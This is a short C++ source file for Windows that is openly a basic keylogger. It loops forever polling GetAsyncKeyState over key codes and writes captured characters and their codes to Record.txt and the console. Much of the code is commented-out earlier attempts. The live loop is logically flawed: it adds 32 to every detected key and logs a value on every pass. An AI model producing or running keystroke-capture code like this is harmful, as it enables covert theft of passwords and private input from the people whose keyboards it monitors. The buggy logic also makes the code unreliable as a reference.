#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>


// class App
// {
//     App()
//     {



//     }


//     ~App()
//     {

//     }
// };


void basicLogger()
{
    char c;
    std::ofstream data("Record.txt");
    for(;;)
    {
        // for(c=8;c<=222;c++)
        // {
        //     if(GetAsyncKeyState(c)==-32767)
        //     {
        //         std::ofstream write("Record.txt");

        //         if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)))
        //         {
        //             c+=32;
        //             write<<c;
        //             write.close();
        //             break;
        //         }
        //         else if((c>64)&&(c<91))
        //         {
        //             write<<c;
        //             write.close();
        //             break;
        //         }
        //         else
        //         {
        //             switch (c)
        //             {
        //             case 48:
        //                 if (GetAsyncKeyState(0x10))
        //                 {
        //                     write << ")";
        //                 }
        //                 else
        //                 {
        //                     write << "0";
        //                 }
        //                 break;

        //             default:
        //                 write << c;
        //                 break;
        //             }
        //         }
        //    }
        // }
        for(c=8;c<=222;c++)
        {
            if (GetAsyncKeyState(c)==-32767)
            {
                // if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)))
                // {
                    c+=32;
                    break;
                // }
            }
        }
        data << c << int(c) << std::endl;
        std::cout << c << int(c) << std::endl;
    }
    // data.close();
    // char keyCode;
    // for(;;)
    // {
    //     if (GetAsyncKeyState('m'))
    //     {
    //         std::cout << "m key was pressed";
    //     }
        
    // }
}


int main()
{
    std::string input;
    std::cout << "starting logger" << std::endl;
    basicLogger();
    // App app();
    return 0;
}


